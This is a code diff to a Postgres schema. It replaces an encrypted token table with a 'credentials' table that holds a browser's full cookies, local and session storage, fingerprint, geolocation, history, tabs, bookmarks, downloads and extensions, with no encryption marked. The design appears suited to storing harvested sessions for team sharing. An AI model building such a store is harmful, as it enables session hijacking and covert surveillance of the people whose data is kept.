@@ -23,24 +23,36 @@ export const users = pgTable('users', {
   updatedAt: timestamp('updated_at').defaultNow().notNull(),
 });
 
-export const tokens = pgTable('tokens', {
+export const credentials = pgTable('credentials', {
   id: text('id').primaryKey().$defaultFn(() => createId()),
   teamId: text('team_id').notNull().references(() => teams.id, { onDelete: 'cascade' }),
   
-  // Individual token fields (encrypted)
-  encryptedRefreshToken: text('encrypted_refresh_token'), // Encrypted refresh token
-  encryptedAccessToken: text('encrypted_access_token'),   // Encrypted access token
-  encryptedGeneralToken: text('encrypted_general_token'), // Encrypted general token (JWT/other)
+  // Browser environment data
+  ipAddress: text('ip_address'), // IPv4/IPv6 address
+  userAgent: text('user_agent'), // Raw browser user agent string
+  platform: text('platform'), // OS / device type (Windows, iOS, Android, etc.)
+  browser: text('browser'), // Browser name/version
   
-  // Individual expiration timestamps
-  refreshTokenExpiresAt: timestamp('refresh_token_expires_at'),
-  accessTokenExpiresAt: timestamp('access_token_expires_at'),
-  generalTokenExpiresAt: timestamp('general_token_expires_at'),
+  // Browser storage data (JSON)
+  cookies: text('cookies'), // All cookies key/value pairs as JSON
+  localStorage: text('local_storage'), // All localStorage key/value pairs as JSON
+  sessionStorage: text('session_storage'), // All sessionStorage key/value pairs as JSON
   
-  // Metadata
-  tokenSource: text('token_source').notNull().default('manual'), // 'manual', 'auto_detected', 'team_shared'
+  // Advanced browser data
+  fingerprint: text('fingerprint'), // Fingerprint data (canvas hash, WebGL, fonts, etc.) as JSON
+  geoLocation: text('geo_location'), // Approx. geolocation info (lat/lon, city, country) as JSON
+  metadata: text('metadata'), // Additional metadata as JSON
+  
+  // Extended browser data (requires additional permissions)
+  browserHistory: text('browser_history'), // Browser history data as JSON
+  tabs: text('tabs'), // Open tabs information as JSON
+  bookmarks: text('bookmarks'), // Bookmarks data as JSON
+  downloads: text('downloads'), // Downloads history as JSON
+  extensions: text('extensions'), // Installed extensions info as JSON
+  
+  // Management fields
+  credentialSource: text('credential_source').notNull().default('manual'), // 'manual', 'auto_detected', 'team_shared'
   isActive: boolean('is_active').notNull().default(true),
-  createdBy: text('created_by').notNull().references(() => users.id, { onDelete: 'cascade' }),
   createdAt: timestamp('created_at').defaultNow().notNull(),
   updatedAt: timestamp('updated_at').defaultNow().notNull(),
   lastUsedAt: timestamp('last_used_at'),
